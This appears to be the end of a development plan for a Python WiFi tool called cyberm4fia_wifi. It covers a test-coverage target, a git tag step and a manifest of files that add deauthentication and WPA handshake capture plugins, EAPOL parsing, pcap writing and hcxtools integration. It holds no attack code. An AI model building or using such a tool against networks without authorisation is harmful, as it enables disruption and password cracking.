Expected: all green; coverage on `core/` and `utils/` remains ≥ 80 %, on `plugins/` ≥ 50 %.

- [ ] **Manual smoke** — see the Phase 2a acceptance checklist in the README.

- [ ] **Tag the phase** once the manual checklist passes:

```bash
git tag -a phase-2a -m "Phase 2a — deauth + handshake"
```

---

## Files Created / Modified (Summary)

```
src/cyberm4fia_wifi/
  core/events.py            modified  (+DeauthSent, +HandshakeComplete, +mfp on BeaconSeen, EAPOLCapture refined)
  core/sniffer.py           modified  (+EAPOL branch, +MFP parse)
  core/session.py           modified  (+handshake_count, +mfp_status, +HandshakeComplete handler)
  plugins/__init__.py       modified  (REGISTRY += DeauthPlugin, HandshakePlugin)
  plugins/deauth.py         new
  plugins/handshake.py      new
  tui/app.py                modified  (+d/h bindings, +action handlers, +log formatters, +AP Details rows)
  tui/modals.py             new       (HandshakeModal + HandshakeRequest)
  utils/eapol.py            new
  utils/pcap_writer.py      new
  utils/hcxtools.py         new

tests/unit/core/
  test_events.py            modified  (+TestPhase2EventDataclasses)
  test_sniffer.py           modified  (+TestEapolDissection, +TestMfpDetection)
  test_session.py           modified  (+TestHandshakeAndMfpFields)
  test_tui_smoke.py         modified  (+d/h binding test, +AP Details test)
  test_deauth_plugin.py     new
  test_handshake_plugin.py  new
  test_handshake_modal.py   new
  test_eapol_utils.py       new
  test_pcap_writer.py       new
  test_hcxtools.py          new

README.md                   modified  (+Phase 2a quickstart + acceptance checklist)
docs/superpowers/specs/2026-05-27-cyberm4fia-wifi-phase2a-design.md  (already committed)
docs/superpowers/plans/2026-05-27-cyberm4fia-wifi-phase2a.md  (this file)
```
